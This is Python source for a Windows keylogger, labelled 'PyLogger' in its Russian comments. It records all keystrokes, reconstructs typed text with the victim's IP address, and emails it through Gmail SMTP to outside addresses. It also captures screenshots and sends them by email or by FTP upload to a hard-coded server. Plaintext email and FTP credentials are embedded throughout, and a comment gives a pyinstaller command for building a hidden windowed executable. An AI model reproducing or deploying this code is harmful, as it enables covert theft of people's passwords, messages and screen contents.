from pynput.keyboard import Key, Listener
import logging
import datetime
import pythoncom
import threading
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import win32event, win32api, winerror
from ftplib import FTP
import win32gui, win32ui, win32con
import socket
import smtplib
import mimetypes
from email.message import EmailMessage
import win32gui
import win32ui
import win32con
from win32api import GetSystemMetrics
c = 0
fl1m = 0
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format="%(message)s")
num_mas = '1234567890'
sp_sim_mas = '!@#$%^&*()_+-=:;"?/.,|\/{}`~'
self_id = 0
id_erned = False
#ftp = FTP('195.69.187.77', user='taxiuser', passwd='XJnLe7XnYZWt3Eh', timeout=600)
#lst = ftp.nlst()

def main():
    def get_ip():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0)
        try:
            # doesn't even have to be reachable
            s.connect(('10.255.255.255', 1))
            IP = s.getsockname()[0]
        except Exception:
            IP = '127.0.0.1'
        finally:
            s.close()
        return IP


    def ftp_upload(ftp_obj, path, ftype='JPG'):
        """
        Функция для загрузки файлов на FTP-сервер
        @param ftp_obj: Объект протокола передачи файлов
        @param path: Путь к файлу для загрузки
        """
        if ftype == 'TXT':
            with open(path) as fobj:
                ftp.storlines('STOR ' + path, fobj)
        else:
            with open(path, 'rb') as fobj:
                ftp.storbinary('STOR ' + path, fobj, 1024)


    def computer_to_human_decoder():
        global c
        global num_mas
        global sp_sim_mas
        global fl1m
        global self_id
        f = open("keylog.txt", "r")
        tx = f.read()[0]
        if tx != "":
            fl1m = 1
        f.close()
        if fl1m == 0:
            print()
            f = open("keylog.txt", "r")
            s = f.read().split('\n')
            print(*s, len(s))
            human_string = ''
            for i in range(len(s)):
                print(s[i])
                if s[i] == 'Key.space':
                    human_string += ' '
                else:
                    s[i] = s[i][1:-1]
                    if s[i].isalpha() or s[i] in num_mas or s[i] in sp_sim_mas:
                        print(i)
                        human_string += s[i]
            s1 = [i[1:-1] for i in s]
            print(human_string)
            t = datetime.datetime.now()
            f1 = open("log.txt", 'w')
            f1.write(f"\n{get_ip()} {str(t)} {str(human_string)}")
            f.close()
            f1.close()
            c = 0
            fl1m = 1
            self_id = get_ip()
        else:
            print(2)
            f = open("keylog.txt", "r")
            s = f.read().split('\n')
            print("!!!!!!!!!!!!!!!!!!!", *s, len(s))
            count = 0
            human_string = ''
            for i in range(len(s) - 1, 0, -1):
                print(i)
                print(s[i])
                if count == 6:
                    break
                if s[i] == 'Key.space':
                    human_string += ' '
                    count += 1
                else:
                    s[i] = s[i][1:-1]
                    if s[i].isalpha() or s[i] in num_mas or s[i] in sp_sim_mas:
                        print(i)
                        human_string += s[i]
            human_string = human_string[::-1]
            s1 = [i[1:-1] for i in s]
            print(human_string)
            t = datetime.datetime.now()
            f1 = open("log.txt", 'w')
            f1.write(f"\n{str(get_ip())} {str(t)} {str(human_string)}")
            f.close()
            f1.close()
            c = 0
        f2 = open("log.txt", "r")
        tx = f2.read().split("\n")[-1]
        print(tx)
        f3 = open("send.txt", "w")
        f3.write(tx)
        f2.close()
        f3.close()
        email()

    def add_to_list():
        global id_erned, self_id
        """
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip_user = s.getsockname()[0]
        s.close()
        ftp = FTP('195.69.187.77', user='taxiuser', passwd='XJnLe7XnYZWt3Eh', timeout=600)
        lst = ftp.nlst()
        try:
            out = 'all_comp_list.txt'
            # print(lst[i], day_cat)
            with open(out, 'wb') as f:
                ftp.retrbinary('RETR ' + f'all_comp_list.txt', f.write)
        except:
            pass"""
        f = open('all_comp_list.txt', 'r')
        rd = f.read()
        f.close()
        tx = str(get_ip())
        if tx not in rd.split("+"):
            f = open("all_comp_list.txt", "a")
            f.write(f"+{str(get_ip())}")
            f.close()
        """
        f = open("all_comp_list.txt", "rb")
        send = ftp.storbinary("STOR "+ "all_comp_list.txt", f)
        f = open("all_comp_list.txt", "rb")
        s = f.read()
        if int(s.split()[0]) == adr:
            test_get_screenshot()
    
        return adr
        """
        return 0


    def test_get_screenshot():
        # define your monitor width and height
        w, h = 1920, 1080

        # for now we will set hwnd to None to capture the primary monitor
        #hwnd = win32gui.FindWindow(None, window_name)
        hwnd = None

        # get the window image data
        wDC = win32gui.GetWindowDC(hwnd)
        dcObj = win32ui.CreateDCFromHandle(wDC)
        cDC = dcObj.CreateCompatibleDC()
        dataBitMap = win32ui.CreateBitmap()
        dataBitMap.CreateCompatibleBitmap(dcObj, w, h)
        cDC.SelectObject(dataBitMap)
        cDC.BitBlt((0, 0), (w, h), dcObj, (0, 0), win32con.SRCCOPY)

        # save the image as a bitmap file
        dataBitMap.SaveBitmapFile(cDC, 'hili.jpg')

        # free resources
        dcObj.DeleteDC()
        cDC.DeleteDC()
        win32gui.ReleaseDC(hwnd, wDC)
        win32gui.DeleteObject(dataBitMap.GetHandle())
        ftp_upload(ftp, "hill.jpg")


    def send_ftp(txt):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3600)
        ftp = FTP('195.69.187.77', user='taxiuser', passwd='XJnLe7XnYZWt3Eh', timeout=600)
        lst = ftp.nlst()


    def email_sender_jpg():
        msg = EmailMessage()
        msg['Subject'] = 'This email contains an attachment'
        msg['From'] = 'acaoco3@gmail.com'
        msg['To'] = 'lisickinoezise@gmail.com'
        # Set text content
        msg.set_content('Please see attached file')

        def take_screenshot():
            w = GetSystemMetrics(0)  # set this
            h = GetSystemMetrics(1)  # set this
            bmpfilenamename = f"{str(get_ip())}.bmp"  # set this
            newWindowTile = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            hwnd = win32gui.FindWindow(None, newWindowTile)
            wDC = win32gui.GetWindowDC(hwnd)
            dcObj = win32ui.CreateDCFromHandle(wDC)
            cDC = dcObj.CreateCompatibleDC()
            dataBitMap = win32ui.CreateBitmap()
            dataBitMap.CreateCompatibleBitmap(dcObj, w, h)
            cDC.SelectObject(dataBitMap)
            cDC.BitBlt((0, 0), (w, h), dcObj, (0, 0), win32con.SRCCOPY)
            dataBitMap.SaveBitmapFile(cDC, bmpfilenamename)

            # Free Resources
            dcObj.DeleteDC()
            cDC.DeleteDC()
            win32gui.ReleaseDC(hwnd, wDC)
            win32gui.DeleteObject(dataBitMap.GetHandle())
        take_screenshot()

        def attach_file_to_email(email, filename):
            """Attach a file identified by filename, to an email message"""
            with open(filename, 'rb') as fp:
                file_data = fp.read()
                maintype, _, subtype = (mimetypes.guess_type(filename)[0] or 'application/octet-stream').partition("/")
                email.add_attachment(file_data, maintype=maintype, subtype=subtype, filename=filename)
        # Attach files
        attach_file_to_email(msg, f"{str(get_ip())}.bmp")

        def send_mail_smtp(mail, host, username, password):
            s = smtplib.SMTP(host)
            s.starttls()
            s.login(username, password)
            s.send_message(mail)
            s.quit()
        send_mail_smtp(msg, 'smtp.gmail.com', 'acaoco3@gmail.com', 'volosynajipe')
        print("picture sent")


    def on_press(key):
        global c
        global id_erned
        logging.info(str(key))
        if str(key) == 'Key.space':
            c += 1
        print(c, str(key))
        if c == 5:
            computer_to_human_decoder()
        if not id_erned:
            self_id = get_ip()
            id_erned = True

 #pyinstaller --onefile --hidden-import=E:\AI_all\venv\Pythn39\Lib\site-packages\pynput --windowed KL2.py

    def email():
        print("in email")
        mail_content = '''
        Привет, я кейлогер!
        '''
        #email_sender_jpg()
        # Получатель, почта кейлоггера и пароль от нее
        sender_address = "acaoco3@gmail.com"
        sender_pass = "volosynajipe"
        receiver_address = "zay1bob@gmail.com"
        print("connected")
        # Настраиваем MIME
        message = MIMEMultipart()
        message['From'] = sender_address
        message['To'] = receiver_address
        message['Subject'] = 'It`s a me, PyLogger!'  # Тема письма
        print("message ready")
        # Читаем файл - отправляем логи
        message.attach(MIMEText(mail_content, 'plain'))
        file = open("send.txt", "r")
        stringlogs = file.read()
        file.close()
        message.attach(MIMEText(stringlogs))

        # Создаем SMTP сессию для отправки письма
        session = smtplib.SMTP('smtp.gmail.com', 587)  # Сервер и порт gmail
        session.starttls()  # Защищенное соединение
        session.login(sender_address, sender_pass)  # Заходим в наш аккаунт
        text = message.as_string()
        session.sendmail(sender_address, receiver_address, text)
        session.quit()
        print('Mail Sent')


    with Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    main()